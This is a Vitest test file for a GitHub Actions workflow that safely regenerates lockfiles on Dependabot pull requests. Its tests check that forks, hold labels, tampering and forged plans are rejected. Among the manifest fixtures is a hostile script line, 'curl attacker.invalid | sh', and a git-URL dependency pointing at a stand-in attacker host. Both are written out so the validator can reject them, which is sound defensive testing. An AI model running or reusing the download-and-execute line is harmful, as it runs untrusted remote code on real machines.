import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';

import { describe, expect, it } from 'vitest';

import {
  buildCreateCommitVariables,
  buildRemediationReceipt,
  classifyDependencyManifestChange,
  classifyEveLockDrift,
  validatePlanAuthority,
  validateRemediationArtifact,
} from '../safe-pr-remediation.mjs';

const HEAD = 'a'.repeat(40);
const BASE = 'b'.repeat(40);
const REPO = 'JovieInc/Jovie';
const BASE_PACKAGE = Buffer.from(
  JSON.stringify({
    scripts: { test: 'vitest run' },
    devDependencies: { '@types/node': '26.1.0' },
  })
);
const HEAD_PACKAGE = Buffer.from(
  JSON.stringify({
    scripts: { test: 'vitest run' },
    devDependencies: { '@types/node': '26.2.0' },
  })
);

function manifestEvidence(baseBytes = BASE_PACKAGE, headBytes = HEAD_PACKAGE) {
  return classifyDependencyManifestChange({ baseBytes, headBytes });
}

function candidate(overrides = {}) {
  return {
    workflowRun: {
      id: 123,
      name: 'Eve Pilot',
      conclusion: 'failure',
      event: 'pull_request',
      head_sha: HEAD,
      pull_requests: [{ number: 16096 }],
    },
    pr: {
      number: 16096,
      state: 'open',
      draft: false,
      user: { login: 'dependabot[bot]' },
      head: {
        sha: HEAD,
        ref: 'dependabot/npm_and_yarn/types-node-26.2.0',
        repo: { full_name: REPO, fork: false },
      },
      base: { ref: 'main', sha: BASE, repo: { full_name: REPO } },
      labels: [{ name: 'dependencies' }, { name: 'automated' }],
    },
    files: [
      'CHANGELOG.md',
      'apps/eve-pilot/package.json',
      'apps/web/package.json',
      'pnpm-lock.yaml',
    ],
    failedJobs: [
      {
        id: 456,
        name: 'Verify isolated Eve pilot',
        conclusion: 'failure',
        log: 'ERR_PNPM_OUTDATED_LOCKFILE Cannot install with frozen-lockfile because pnpm-lock.yaml is not up to date with <ROOT>/package.json',
      },
    ],
    repository: REPO,
    manifestEvidence: manifestEvidence(),
    ...overrides,
  };
}

describe('safe Eve lockfile remediation admission', () => {
  it('admits only the exact failed Dependabot head with the isolated lock signature', () => {
    const result = classifyEveLockDrift(candidate());

    expect(result).toMatchObject({
      eligible: true,
      plan: {
        schema: 'jovie-safe-pr-remediation/v1',
        repository: REPO,
        prNumber: 16096,
        expectedHeadOid: HEAD,
        baseOid: BASE,
        headRefName: 'dependabot/npm_and_yarn/types-node-26.2.0',
        workflowRunId: 123,
        failedJobId: 456,
        kind: 'eve-isolated-lockfile',
      },
    });
  });

  it.each([
    [
      'fork',
      {
        pr: {
          ...candidate().pr,
          head: {
            ...candidate().pr.head,
            repo: { full_name: 'attacker/fork', fork: true },
          },
        },
      },
    ],
    [
      'non-Dependabot author',
      { pr: { ...candidate().pr, user: { login: 'some-user' } } },
    ],
    [
      'invalid base',
      {
        pr: {
          ...candidate().pr,
          base: { ...candidate().pr.base, sha: 'not-a-sha' },
        },
      },
    ],
    [
      'hard hold',
      {
        pr: {
          ...candidate().pr,
          labels: [
            { name: 'dependencies' },
            { name: 'automated' },
            { name: 'needs-human' },
          ],
        },
      },
    ],
    [
      'source edit',
      { files: [...candidate().files, 'apps/eve-pilot/agent/index.ts'] },
    ],
    [
      'wrong failure',
      {
        failedJobs: [
          {
            id: 456,
            name: 'Verify isolated Eve pilot',
            conclusion: 'failure',
            log: 'assertion failed',
          },
        ],
      },
    ],
    [
      'pre-touched Eve lockfile',
      { files: [...candidate().files, 'apps/eve-pilot/pnpm-lock.yaml'] },
    ],
  ])('rejects %s', (_name, override) => {
    expect(classifyEveLockDrift(candidate(override))).toMatchObject({
      eligible: false,
    });
  });

  it.each([
    'fast',
    'gated',
    'hold',
    'human-review-required',
    'needs-conflict-resolution',
    'needs-human',
    'needs-human-review',
    'needs-human-taste',
    'needs-manual-rebase',
    'no-auto',
    'queue-deferred',
    'taste',
  ])('rejects the %s hold', label => {
    const pr = {
      ...candidate().pr,
      labels: [...candidate().pr.labels, { name: label }],
    };
    expect(classifyEveLockDrift(candidate({ pr }))).toMatchObject({
      eligible: false,
      reason: 'hard-hold',
    });
  });
});

describe('trusted dependency manifest evidence', () => {
  it('allows only a registry-semver dependency version change', () => {
    expect(manifestEvidence()).toMatchObject({
      valid: true,
      evidence: {
        path: 'apps/eve-pilot/package.json',
        changes: [
          {
            section: 'devDependencies',
            name: '@types/node',
            before: '26.1.0',
            after: '26.2.0',
          },
        ],
      },
    });
  });

  it.each([
    [
      'script mutation',
      Buffer.from(
        JSON.stringify({
          scripts: { test: 'curl attacker.invalid | sh' },
          devDependencies: { '@types/node': '26.2.0' },
        })
      ),
      'manifest-policy-field-changed',
    ],
    [
      'non-registry dependency',
      Buffer.from(
        JSON.stringify({
          scripts: { test: 'vitest run' },
          devDependencies: { '@types/node': 'git+https://attacker.invalid/x' },
        })
      ),
      'non-registry-semver-change',
    ],
  ])('rejects %s', (_name, headBytes, reason) => {
    expect(manifestEvidence(BASE_PACKAGE, headBytes)).toEqual({
      valid: false,
      reason,
    });
  });
});

describe('secretless test receipt and atomic writer', () => {
  const plan = classifyEveLockDrift(candidate()).plan;
  const packageBytes = HEAD_PACKAGE;
  const lockfileBytes = Buffer.from("lockfileVersion: '9.0'\n");

  it('binds the tested artifact to repo, PR, exact head, manifest, lockfile, and commands', () => {
    const receipt = buildRemediationReceipt({
      plan,
      packageBytes,
      lockfileBytes,
    });

    expect(
      validateRemediationArtifact({
        plan,
        freshPr: candidate().pr,
        freshFiles: candidate().files,
        receipt,
        packageBytes,
        freshBasePackageBytes: BASE_PACKAGE,
        freshPackageBytes: packageBytes,
        lockfileBytes,
        expectedRepository: REPO,
        expectedWorkflowRunId: 123,
      })
    ).toEqual({ valid: true });
    expect(receipt.testCommands).toEqual([
      'pnpm install --ignore-workspace --frozen-lockfile --ignore-scripts',
      'pnpm run typecheck',
      'pnpm run test',
      'pnpm run build',
    ]);
  });

  it('refuses head drift and artifact tampering', () => {
    const receipt = buildRemediationReceipt({
      plan,
      packageBytes,
      lockfileBytes,
    });
    const driftedPr = {
      ...candidate().pr,
      head: { ...candidate().pr.head, sha: 'b'.repeat(40) },
    };

    expect(
      validateRemediationArtifact({
        plan,
        freshPr: driftedPr,
        freshFiles: candidate().files,
        receipt,
        packageBytes,
        freshBasePackageBytes: BASE_PACKAGE,
        freshPackageBytes: packageBytes,
        lockfileBytes,
        expectedRepository: REPO,
        expectedWorkflowRunId: 123,
      })
    ).toMatchObject({ valid: false, reason: 'head-drift' });
    expect(
      validateRemediationArtifact({
        plan,
        freshPr: candidate().pr,
        freshFiles: candidate().files,
        receipt,
        packageBytes,
        freshBasePackageBytes: BASE_PACKAGE,
        freshPackageBytes: packageBytes,
        lockfileBytes: Buffer.from('tampered'),
        expectedRepository: REPO,
        expectedWorkflowRunId: 123,
      })
    ).toMatchObject({ valid: false, reason: 'lockfile-hash-mismatch' });
  });

  it('uses GitHub atomic expectedHeadOid and changes only the isolated lockfile', () => {
    const receipt = buildRemediationReceipt({
      plan,
      packageBytes,
      lockfileBytes,
    });
    const variables = buildCreateCommitVariables({
      plan,
      receipt,
      lockfileBytes,
    });

    expect(variables.input.branch).toEqual({
      repositoryNameWithOwner: REPO,
      branchName: plan.headRefName,
    });
    expect(variables.input.expectedHeadOid).toBe(HEAD);
    expect(variables.input.fileChanges).toEqual({
      additions: [
        {
          path: 'apps/eve-pilot/pnpm-lock.yaml',
          contents: lockfileBytes.toString('base64'),
        },
      ],
    });
    expect(variables.input.fileChanges.deletions).toBeUndefined();
  });

  it('rejects forged artifact authority and hardcodes the only writable path', () => {
    const receipt = buildRemediationReceipt({
      plan,
      packageBytes,
      lockfileBytes,
    });
    const forgedPlan = { ...plan, lockfilePath: 'README.md' };

    expect(
      validatePlanAuthority({
        plan: forgedPlan,
        expectedRepository: REPO,
        expectedWorkflowRunId: 123,
      })
    ).toMatchObject({ valid: false });
    expect(() =>
      buildCreateCommitVariables({
        plan: forgedPlan,
        receipt,
        lockfileBytes,
      })
    ).toThrow('invalid remediation authority');
    expect(
      buildCreateCommitVariables({ plan, receipt, lockfileBytes }).input
        .fileChanges.additions[0].path
    ).toBe('apps/eve-pilot/pnpm-lock.yaml');
  });
});

describe('GitHub Actions remediation separation', () => {
  const workflow = readFileSync(
    resolve(process.cwd(), '.github/workflows/safe-pr-remediation.yml'),
    'utf8'
  );

  it('dispatches only after the isolated Eve workflow fails', () => {
    expect(workflow).toContain("workflows: ['Eve Pilot']");
    expect(workflow).toContain('types: [completed]');
    expect(workflow).toContain(
      "github.event.workflow_run.conclusion == 'failure'"
    );
  });

  it('separates read-only planning, secretless PR-code tests, and the CAS writer', () => {
    expect(workflow).toMatch(/plan:[\s\S]*actions: read[\s\S]*contents: read/);
    expect(workflow).toMatch(
      /prepare:[\s\S]*permissions:\n\s+contents: read[\s\S]*ref: \$\{\{ needs\.plan\.outputs\.expected_head \}\}/
    );
    expect(workflow).toMatch(
      /Checkout immutable trusted policy[\s\S]*ref: \$\{\{ github\.sha \}\}[\s\S]*path: \.safe-remediation-policy/
    );
    expect(workflow).toContain(
      'node .safe-remediation-policy/scripts/lib/safe-pr-remediation.mjs receipt'
    );
    expect(workflow).toContain('working-directory: candidate/apps/eve-pilot');
    expect(workflow).toContain(
      'pnpm install --ignore-workspace --frozen-lockfile --ignore-scripts'
    );
    expect(workflow).toMatch(
      /commit:[\s\S]*needs: \[plan, prepare, test\][\s\S]*safe-pr-remediation\.mjs commit/
    );
    expect(workflow).toMatch(
      /test:[\s\S]*needs: \[plan, prepare\][\s\S]*permissions:\n\s+contents: read/
    );
    expect(workflow).toContain('Decode the trusted plan output');
    expect(workflow).toContain(
      'artifact_id: ${{ steps.upload.outputs.artifact-id }}'
    );
    expect(
      workflow.match(
        /artifact-ids: \$\{\{ needs\.prepare\.outputs\.artifact_id \}\}/g
      )
    ).toHaveLength(2);
    expect(workflow).not.toMatch(
      /Download immutable generated artifact[\s\S]{0,300}\n\s+name:/
    );
    expect(workflow).toContain('permission-contents: write');
    expect(workflow).toContain('STATUS_TOKEN: ${{ github.token }}');
    expect(workflow).not.toContain('permission-statuses: write');
    expect(workflow).not.toContain('CLAUDE_CODE_OAUTH_TOKEN');
    expect(workflow).not.toContain('git push');
    expect(workflow).not.toContain('self-hosted');
  });
});
